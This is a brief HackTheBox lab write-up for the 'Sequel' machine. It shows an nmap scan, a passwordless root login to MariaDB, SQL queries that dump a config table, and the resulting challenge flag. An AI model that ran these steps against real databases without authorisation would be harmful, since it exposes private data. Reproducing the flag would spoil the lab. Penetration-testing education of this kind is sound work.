# Sequel - HackTheBox Write-up

## Overview
The **Sequel** machine required us to exploit a misconfigured MySQL instance running MariaDB to retrieve sensitive information. This write-up covers enumeration, gaining access, and retrieving the final flag.

## Enumeration
1. **Nmap Scan**:
   - Command: `nmap -sC -sV -p3306 <IP>`
   - Result: Open port `3306` running `MariaDB 10.3.27`.

2. **Database Access**:
   - Authentication: `root` with no password.
   - Connected using: `mysql -h <IP> -u root`.

## Exploitation
1. **Databases**:
   - Command: `SHOW databases;`
   - Output:
     ```
     information_schema
     mysql
     performance_schema
     htb
     ```

2. **Tables in `htb` Database**:
   - Command: `USE htb; SHOW tables;`
   - Output:
     ```
     config
     users
     ```

3. **Retrieving Flag**:
   - Command: `SELECT * FROM config;`
   - Output: `7b4bec00d1a39e3dd4e021ec3d915da8`

## Key Learnings
- MySQL misconfigurations can lead to critical data exposure.
- Always check for passwordless `root` access on services like MySQL during penetration tests.

---

## Flag
- **Root Flag**: `7b4bec00d1a39e3dd4e021ec3d915da8`
